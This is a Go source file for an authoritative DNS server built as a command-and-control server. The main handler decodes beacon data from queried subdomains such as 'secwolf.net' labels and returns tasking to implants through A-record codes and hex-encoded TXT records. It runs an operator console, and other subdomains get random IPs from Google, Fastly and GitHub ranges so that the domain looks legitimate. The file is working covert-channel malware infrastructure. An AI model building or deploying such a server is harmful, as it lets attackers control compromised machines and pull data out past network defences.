package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

// Global variables
var c2Manager *C2Manager
var debugMode bool

// forwardDNSQuery forwards a DNS query to an upstream DNS server
func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
	// Connect to upstream DNS server
	conn, err := net.Dial("udp", upstreamAddr)
	if err != nil {
		if debugMode {
			fmt.Printf("[Forward] Failed to connect to upstream %s: %v\n", upstreamAddr, err)
		}
		// Return SERVFAIL if we can't forward
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
			return serializeMessage(respMsg), nil
		}
		return nil, err
	}
	defer conn.Close()

	// Set timeout for upstream query
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// Forward the original packet
	_, err = conn.Write(packet)
	if err != nil {
		if debugMode {
			fmt.Printf("[Forward] Failed to send to upstream: %v\n", err)
		}
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
			return serializeMessage(respMsg), nil
		}
		return nil, err
	}

	// Read response from upstream
	buffer := make([]byte, 512)
	n, err := conn.Read(buffer)
	if err != nil {
		if debugMode {
			fmt.Printf("[Forward] Failed to read from upstream: %v\n", err)
		}
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			respMsg := buildResponse(msg, nil, 2 /*SERVFAIL*/)
			return serializeMessage(respMsg), nil
		}
		return nil, err
	}

	if debugMode {
		fmt.Printf("[Forward] Successfully forwarded query to %s, got %d bytes response\n", upstreamAddr, n)
	}

	// Return the upstream response
	response := make([]byte, n)
	copy(response, buffer[:n])
	return response, nil
}

// Configuration-based zones initialized from config
var zoneA map[string]string
var zoneAAAA map[string]string
var zoneCNAME map[string]string
var zoneNS map[string]string

// getOutboundIP gets the preferred outbound IP of this machine
func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// initializeZones sets up our authoritative zones based on configuration
func initializeZones(cfg Config) {
	// Initialize maps
	zoneA = make(map[string]string)
	zoneAAAA = make(map[string]string)
	zoneCNAME = make(map[string]string)
	zoneNS = make(map[string]string)

	// Set up NS records for our domain
	zoneNS[cfg.Domain] = cfg.NS1

	// Determine server IP for A records
	// Priority: 1) server_address from config, 2) bind_addr if not 0.0.0.0, 3) auto-detect
	serverIP := cfg.SvrAddr
	if serverIP == "" {
		if cfg.BindAddr != "0.0.0.0" && cfg.BindAddr != "" {
			serverIP = cfg.BindAddr
		} else {
			// Try to auto-detect the external IP
			serverIP = getOutboundIP()
			if serverIP == "" {
				serverIP = "127.0.0.1" // Fallback
			}
		}
	}

	zoneA[cfg.NS1] = serverIP
	zoneA[cfg.NS2] = serverIP // Both can point to same IP for simplicity

	// Optional: Set up apex record
	zoneA[cfg.Domain] = serverIP
} // generateRandomIP generates a random, legitimate-looking IP address
// Avoids private ranges and common reserved addresses
func generateRandomIP() string {
	// Use publicly routable IP ranges that look legitimate
	publicRanges := []struct {
		base []byte
		mask byte
	}{
		{[]byte{1, 0, 0, 0}, 8},      // 1.0.0.0/8 (mostly public)
		{[]byte{8, 8, 0, 0}, 16},     // 8.8.0.0/16 (Google DNS range area)
		{[]byte{74, 125, 0, 0}, 16},  // 74.125.0.0/16 (Google range)
		{[]byte{151, 101, 0, 0}, 16}, // 151.101.0.0/16 (Fastly CDN)
		{[]byte{185, 199, 0, 0}, 16}, // 185.199.0.0/16 (GitHub Pages)
	}

	// Select a random range
	selectedRange := publicRanges[rand.Intn(len(publicRanges))]

	// Generate random IP within that range
	ip := make([]byte, 4)
	copy(ip, selectedRange.base)

	// Randomize the host portion based on mask
	switch selectedRange.mask {
	case 8:
		ip[1] = byte(rand.Intn(256))
		ip[2] = byte(rand.Intn(256))
		ip[3] = byte(1 + rand.Intn(254)) // Avoid .0 and .255
	case 16:
		ip[2] = byte(rand.Intn(256))
		ip[3] = byte(1 + rand.Intn(254)) // Avoid .0 and .255
	}

	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

// toIPv4 converts a dotted string like "1.2.3.4" into 4 bytes.
func toIPv4(s string) ([]byte, bool) {
	// Trim whitespace to handle accidental spaces
	s = strings.TrimSpace(s)
	ip := net.ParseIP(s)
	if ip == nil {
		return nil, false
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return nil, false
	}
	return []byte(ip4), true
}

func toIPv6(s string) ([]byte, bool) {
	// Trim whitespace to handle accidental spaces
	s = strings.TrimSpace(s)
	ip := net.ParseIP(s)
	if ip == nil {
		return nil, false
	}
	ip6 := ip.To16()
	if ip6 == nil || ip.To4() != nil { // ensure it's real IPv6, not IPv4-mapped
		return nil, false
	}
	return []byte(ip6), true
}

// handleQuery takes a raw DNS packet, parses it, and builds a response.
// Enhanced to handle C2 beacon communication via DNS queries.
// Acts as authoritative DNS server for configured domain.
func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
	// 1) Parse the incoming message (header + questions)
	msg, _, err := parseMessage(packet)
	if err != nil {
		// If parsing fails, return a minimal FORMERR response
		resp := buildResponse(DNSMessage{Header: DNSHeader{ID: 0}}, nil, 1 /*FORMERR*/)
		return serializeMessage(resp), nil
	}

	// Only handle single-question queries (standard for DNS)
	if msg.Header.QDCount != 1 {
		resp := buildResponse(msg, nil, 1 /*FORMERR*/)
		return serializeMessage(resp), nil
	}

	// Check for C2 beacon communication first
	for _, q := range msg.Questions {
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")

		// Process potential C2 beacon query
		if c2Response, isC2 := c2Manager.processBeaconQuery(qname, clientIP); isC2 {
			// Create C2 response
			var answers []DNSResourceRecord

			switch q.Type {
			case 1: // A record - encode simple responses in IP
				if c2Response == "ACK" {
					// Use a special IP to indicate acknowledgment
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   1,                    // Short TTL for C2 traffic
						RData: []byte{127, 0, 0, 1}, // localhost
					})
				} else {
					// Use different IP to indicate task available
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   1,
						RData: []byte{127, 0, 0, 2}, // localhost+1
					})
				}

			case 16: // TXT record - encode response as hex in TXT
				hexEncoded := hex.EncodeToString([]byte(c2Response))
				// TXT records need proper length-prefixed format
				// Each string in a TXT record can be max 255 bytes
				var txtData []byte

				// Split into 255-byte chunks if needed
				for len(hexEncoded) > 0 {
					chunkSize := len(hexEncoded)
					if chunkSize > 255 {
						chunkSize = 255
					}
					chunk := hexEncoded[:chunkSize]
					hexEncoded = hexEncoded[chunkSize:]

					// Add length prefix and chunk
					txtData = append(txtData, byte(len(chunk)))
					txtData = append(txtData, []byte(chunk)...)
				}

				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  16,
					Class: 1,
					TTL:   1,
					RData: txtData,
				})
			}

			respMsg := buildResponse(msg, answers, 0)
			return serializeMessage(respMsg), nil
		}
	}

	// 2) Build answers for questions (A, AAAA, CNAME, NS)
	var answers []DNSResourceRecord
	var additionals []DNSResourceRecord
	for _, q := range msg.Questions {
		// Normalize name: our zone keys are lower-case without trailing dot
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
		if q.Class != 1 /*IN*/ {
			continue
		}

		switch q.Type {
		case 1: // A
			if ipStr, ok := zoneA[qname]; ok {
				// Return configured static IP (like for NS records)
				if ip4, ok2 := toIPv4(ipStr); ok2 {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   60,
						RData: ip4,
					})
				}
			} else if strings.HasSuffix(qname, cfg.Domain) {
				// For subdomains of our domain that aren't static, return random IP
				// This makes it look like a legitimate domain with various services
				randomIP := generateRandomIP()
				if ip4, ok2 := toIPv4(randomIP); ok2 {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
						TTL:   300, // Longer TTL for random responses
						RData: ip4,
					})
				}
			}

		case 28: // AAAA
			if ipStr, ok := zoneAAAA[qname]; ok {
				if ip6, ok2 := toIPv6(ipStr); ok2 {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  28,
						Class: 1,
						TTL:   60,
						RData: ip6,
					})
				}
			}

		case 5: // CNAME
			if tgt, ok := zoneCNAME[qname]; ok {
				// CNAME RDATA is the target name encoded as a domain name; we'll let serializer do name bytes,
				// but since our serializer currently expects RData raw bytes, we need to store name wire here.
				// Simpler approach: put a placeholder; we will pack as name in additional handling below.
				// Instead, we choose to not use RData for name-typed RRs directly; we'll special-case in serialization later if needed.
				// For now, encode name without compression for RData (simple but valid); reuse appendName then take tail.
				nameBytes := appendName(nil, tgt)
				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  5,
					Class: 1,
					TTL:   60,
					RData: nameBytes,
				})
				// Provide glue A/AAAA for target if present
				tname := strings.TrimSuffix(strings.ToLower(tgt), ".")
				if ipStr, ok := zoneA[tname]; ok {
					if ip4, ok2 := toIPv4(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  tgt,
							Type:  1,
							Class: 1,
							TTL:   60,
							RData: ip4,
						})
					}
				}
				if ipStr, ok := zoneAAAA[tname]; ok {
					if ip6, ok2 := toIPv6(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  tgt,
							Type:  28,
							Class: 1,
							TTL:   60,
							RData: ip6,
						})
					}
				}
			}

		case 2: // NS
			// Return NS rr for zone apex
			if ns, ok := zoneNS[qname]; ok {
				nsWire := appendName(nil, ns)
				answers = append(answers, DNSResourceRecord{
					Name:  q.Name,
					Type:  2,
					Class: 1,
					TTL:   300,
					RData: nsWire,
				})
				// Optionally include A/AAAA for the NS host in additionals
				h := strings.TrimSuffix(strings.ToLower(ns), ".")
				if ipStr, ok := zoneA[h]; ok {
					if ip4, ok2 := toIPv4(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  ns,
							Type:  1,
							Class: 1,
							TTL:   300,
							RData: ip4,
						})
					}
				}
				if ipStr, ok := zoneAAAA[h]; ok {
					if ip6, ok2 := toIPv6(ipStr); ok2 {
						additionals = append(additionals, DNSResourceRecord{
							Name:  ns,
							Type:  28,
							Class: 1,
							TTL:   300,
							RData: ip6,
						})
					}
				}
			}
		}
	}

	// If we formed answers, return them
	if len(answers) > 0 {
		rcode := uint8(0) // NOERROR
		respMsg := buildResponse(msg, answers, rcode)
		respMsg.Additionals = additionals
		respMsg.Header.ARCount = uint16(len(respMsg.Additionals))
		return serializeMessage(respMsg), nil
	}

	// No answer found - as authoritative server, we should respond authoritatively
	// Check if this is a query for our domain
	for _, q := range msg.Questions {
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
		if strings.HasSuffix(qname, cfg.Domain) {
			// This is for our domain but we don't have a record - return NXDOMAIN
			respMsg := buildResponse(msg, nil, 3 /*NXDOMAIN*/)
			return serializeMessage(respMsg), nil
		}
	}

	// Query not for our domain - forward to upstream DNS server
	if cfg.ForwardDNS {
		return forwardDNSQuery(packet, cfg.UpstreamDNS)
	}

	// If forwarding disabled, return REFUSED
	respMsg := buildResponse(msg, nil, 5 /*REFUSED*/)
	return serializeMessage(respMsg), nil
}

func main() {
	// Parse command line flags
	debugFlag := flag.Bool("d", false, "Enable debug mode (overrides config)")
	flag.Parse()

	// Load configuration (from config.json or DNS_CONFIG env var)
	cfg, err := LoadConfig()
	if err != nil {
		panic(fmt.Sprintf("failed to load config: %v", err))
	}

	// Command line flag overrides config file
	if *debugFlag {
		cfg.Debug = true
	}
	debugMode = cfg.Debug

	// Initialize C2Manager
	c2Manager = NewC2Manager(debugMode)

	bindAddr := fmt.Sprintf("%s:%d", cfg.BindAddr, cfg.BindPort)

	// Use "udp4" to force IPv4 only (avoid IPv6 binding issues)
	pc, err := net.ListenPacket("udp4", bindAddr)
	if err != nil {
		panic(fmt.Sprintf("failed to listen on %s: %v", bindAddr, err))
	}
	defer pc.Close()

	// Initialize our authoritative zones
	initializeZones(cfg)

	// Note: Go 1.20+ automatically seeds the global random generator
	// No need for explicit rand.Seed() call

	// Log the actual local address we're bound to
	localAddr := pc.LocalAddr()
	fmt.Printf("Authoritative DNS C2 Server for %s listening on %s (local: %s)\n",
		cfg.Domain, bindAddr, localAddr.String())

	if cfg.ForwardDNS {
		fmt.Printf("DNS Forwarding: Enabled (upstream: %s)\n", cfg.UpstreamDNS)
	} else {
		fmt.Printf("DNS Forwarding: Disabled (authoritative only)\n")
	}

	// Warn if binding to 0.0.0.0 (could cause interface issues)
	if cfg.BindAddr == "0.0.0.0" {
		fmt.Println("WARNING: Binding to 0.0.0.0 - responses may come from unexpected interface")
	}

	fmt.Println("C2 Management Console: Use 'help' for available commands")

	// Start C2 management console in a separate goroutine
	go startC2Console()

	// Increase read buffer if needed for performance
	_ = pc.SetReadDeadline(time.Time{})

	buf := make([]byte, 512) // typical DNS UDP packet size
	for {
		n, raddr, err := pc.ReadFrom(buf)
		if err != nil {
			fmt.Println("read error:", err)
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])

		// Log incoming queries (debug mode only)
		if debugMode {
			if msg, _, err := parseMessage(pkt); err == nil {
				for _, q := range msg.Questions {
					qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
					fmt.Printf("client=%s id=0x%04X q=%s type=%d class=%d",
						raddr.String(), msg.Header.ID, q.Name, q.Type, q.Class)

					// Check if this looks like C2 traffic
					if strings.Contains(qname, "secwolf.net") {
						parts := strings.SplitN(qname, ".", 2)
						if len(parts) > 0 && len(parts[0]) > 20 {
							fmt.Printf(" [C2]")
							if decoded, decErr := c2Manager.decodeBeaconData(parts[0]); decErr == nil {
								fmt.Printf(" decoded=%s", decoded)
							}
						}
					}
					fmt.Println()
				}
			} else {
				fmt.Printf("client=%s parse_error=%v\n", raddr.String(), err)
			}
		}

		// Handle the query
		clientIP := raddr.String()
		if host, _, err := net.SplitHostPort(clientIP); err == nil {
			clientIP = host
		}

		resp, err := handleQuery(pkt, cfg, clientIP)

		if err != nil {
			fmt.Printf("ERROR handling query: %v\n", err)
			continue
		}

		if len(resp) == 0 {
			if debugMode {
				fmt.Printf("WARNING: empty response generated\n")
			}
			continue
		}

		// Send the response back to the same address
		bytesWritten, writeErr := pc.WriteTo(resp, raddr)
		if writeErr != nil {
			fmt.Printf("ERROR writing response: %v\n", writeErr)
			continue
		}

		// Log only in debug mode
		if debugMode {
			if validateMsg, _, parseErr := parseMessage(resp); parseErr == nil {
				fmt.Printf("→ Sent %d bytes, ID=0x%04X, answers=%d to %s\n",
					bytesWritten, validateMsg.Header.ID, validateMsg.Header.ANCount, raddr.String())
			}
		}
	}
}
